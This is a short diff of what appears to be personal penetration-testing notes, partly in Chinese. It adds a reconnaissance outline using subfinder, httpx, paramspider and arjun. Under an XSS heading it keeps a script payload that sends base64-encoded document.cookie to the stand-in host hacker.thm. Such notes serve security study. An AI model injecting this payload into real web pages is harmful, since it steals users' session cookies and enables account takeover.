@@ -1,3 +1,8 @@
+# 思路
+subfinder 子域探测
+httpx 进行HTTP测试
+paramspider/arjun 参数测试
+
 # XSS
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
